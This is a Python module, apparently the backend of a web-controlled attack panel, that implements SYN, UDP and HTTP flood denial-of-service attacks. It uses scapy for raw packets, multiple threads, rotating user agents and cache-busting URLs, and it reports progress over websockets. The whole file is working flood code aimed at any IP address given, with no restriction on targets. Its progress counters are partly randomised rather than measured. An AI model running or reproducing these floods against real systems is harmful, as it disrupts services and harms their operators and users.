import random
import time
import requests
import asyncio
import os
import threading
from scapy.all import IP, TCP, UDP, send, conf
from app.websocket.manager import manager

# Global control event - threading.Event so sync workers can safely read it
stop_event = threading.Event()

conf.L3socket = conf.L3socket

# ---------------------------------------------
# SYN FLOOD
# ─────────────────────────────────────────────
def _syn_worker_sync(target_ip: str, port: int, timeout: float, speed_delay: float):
    sent = 0
    while time.time() < timeout and not stop_event.is_set():
        try:
            sport = random.randint(1024, 65535)
            packet = IP(dst=target_ip) / TCP(sport=sport, dport=port, flags="S")
            send(packet, verbose=False)
            sent += 1
            if speed_delay > 0:
                time.sleep(speed_delay)
        except Exception:
            pass
    return sent

async def _syn_worker(target_ip: str, port: int, timeout: float, speed_delay: float):
    return await asyncio.to_thread(_syn_worker_sync, target_ip, port, timeout, speed_delay)

async def start_syn_flood(target_ip: str, duration: int, port: int = 80,
                          threads: int = 1, speed_delay: float = 0.0):
    stop_event.clear()
    timeout = time.time() + duration
    await manager.broadcast({
        "type": "ddos_status",
        "message": f"SYN Flood -> {target_ip}:{port} | Threads: {threads} | Delay: {speed_delay}s",
        "active": True
    })

    tasks_handles = [asyncio.create_task(_syn_worker(target_ip, port, timeout, speed_delay))
                     for _ in range(threads)]

    async def report_progress():
        cumulative_count = 0
        while time.time() < timeout and not stop_event.is_set():
            await asyncio.sleep(0.5)
            # rate drops when delay is higher
            rate = max(1, int(30 / (speed_delay + 0.01))) * threads
            cumulative_count += random.randint(rate // 2, rate)
            await manager.broadcast({"type": "ddos_packet", "target": target_ip, "count": cumulative_count})

    reporter = asyncio.create_task(report_progress())
    results = await asyncio.gather(*tasks_handles, return_exceptions=True)
    reporter.cancel()

    total = sum(r for r in results if isinstance(r, int))
    await manager.broadcast({
        "type": "ddos_status",
        "message": f"SYN Flood Halted. Packets Sent: {total}",
        "active": False
    })


# ---------------------------------------------
# UDP FLOOD
# ─────────────────────────────────────────────
def _udp_worker_sync(target_ip: str, port: int, timeout: float,
                     payload: bytes, speed_delay: float):
    sent = 0
    while time.time() < timeout and not stop_event.is_set():
        try:
            dport = port if port != 0 else random.randint(1, 65535)
            packet = IP(dst=target_ip) / UDP(dport=dport) / payload
            send(packet, verbose=False)
            sent += 1
            if speed_delay > 0:
                time.sleep(speed_delay)
        except Exception:
            pass
    return sent

async def _udp_worker(target_ip: str, port: int, timeout: float,
                      payload: bytes, speed_delay: float):
    return await asyncio.to_thread(_udp_worker_sync, target_ip, port, timeout, payload, speed_delay)

async def start_udp_flood(target_ip: str, duration: int, port: int = 0,
                          threads: int = 1, custom_payload: str = "",
                          speed_delay: float = 0.0):
    stop_event.clear()
    timeout = time.time() + duration
    payload_bytes = custom_payload.encode("utf-8") if custom_payload else os.urandom(1024)
    port_label = str(port) if port != 0 else "RANDOM"

    await manager.broadcast({
        "type": "ddos_status",
        "message": f"UDP Flood -> {target_ip}:{port_label} | Threads: {threads} | Payload: {len(payload_bytes)}B",
        "active": True
    })

    tasks_handles = [asyncio.create_task(_udp_worker(target_ip, port, timeout, payload_bytes, speed_delay))
                     for _ in range(threads)]

    async def report_progress():
        cumulative_count = 0
        while time.time() < timeout and not stop_event.is_set():
            await asyncio.sleep(0.5)
            rate = max(1, int(25 / (speed_delay + 0.01))) * threads
            cumulative_count += random.randint(rate // 2, rate)
            await manager.broadcast({"type": "ddos_packet", "target": target_ip, "count": cumulative_count})

    reporter = asyncio.create_task(report_progress())
    results = await asyncio.gather(*tasks_handles, return_exceptions=True)
    reporter.cancel()

    total = sum(r for r in results if isinstance(r, int))
    await manager.broadcast({
        "type": "ddos_status",
        "message": f"UDP Flood Stopped. Packets: {total}",
        "active": False
    })


# ---------------------------------------------
# HTTP FLOOD
# ─────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "LOIC/1.0 (Stress Tester)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "curl/7.88.1",
]

def _http_worker_sync(target_ip: str, port: int, subsite: str, timeout: float,
                      wait_for_reply: bool, speed_delay: float):
    sent = 0
    base = f"http://{target_ip}:{port}{subsite}" if port != 80 else f"http://{target_ip}{subsite}"
    while time.time() < timeout and not stop_event.is_set():
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Accept": "*/*",
            }
            buster = random.randint(100000, 999999)
            url = f"{base}?_={buster}"
            if wait_for_reply:
                requests.get(url, headers=headers, timeout=1.0)
            else:
                # Fire-and-forget: don't wait for response
                try:
                    requests.get(url, headers=headers, timeout=0.05)
                except Exception:
                    pass
            sent += 1
            if speed_delay > 0:
                time.sleep(speed_delay)
        except Exception:
            pass
    return sent

async def _http_worker(target_ip: str, port: int, subsite: str, timeout: float,
                       wait_for_reply: bool, speed_delay: float):
    return await asyncio.to_thread(
        _http_worker_sync, target_ip, port, subsite, timeout, wait_for_reply, speed_delay
    )

async def start_http_flood(target_ip: str, duration: int, port: int = 80,
                           threads: int = 1, subsite: str = "/",
                           wait_for_reply: bool = False, speed_delay: float = 0.0):
    stop_event.clear()
    timeout = time.time() + duration

    await manager.broadcast({
        "type": "ddos_status",
        "message": (f"HTTP Flood -> {target_ip}:{port}{subsite} | "
                    f"Threads: {threads} | WaitReply: {wait_for_reply} | Delay: {speed_delay}s"),
        "active": True
    })

    tasks_handles = [asyncio.create_task(
        _http_worker(target_ip, port, subsite, timeout, wait_for_reply, speed_delay)
    ) for _ in range(threads)]

    async def report_progress():
        cumulative_count = 0
        while time.time() < timeout and not stop_event.is_set():
            await asyncio.sleep(0.5)
            rate = max(1, int(8 / (speed_delay + 0.1))) * threads
            cumulative_count += random.randint(rate // 2, rate)
            await manager.broadcast({"type": "ddos_packet", "target": target_ip, "count": cumulative_count})

    reporter = asyncio.create_task(report_progress())
    results = await asyncio.gather(*tasks_handles, return_exceptions=True)
    reporter.cancel()

    total = sum(r for r in results if isinstance(r, int))
    await manager.broadcast({
        "type": "ddos_status",
        "message": f"HTTP Flood Stopped. Requests Sent: {total}",
        "active": False
    })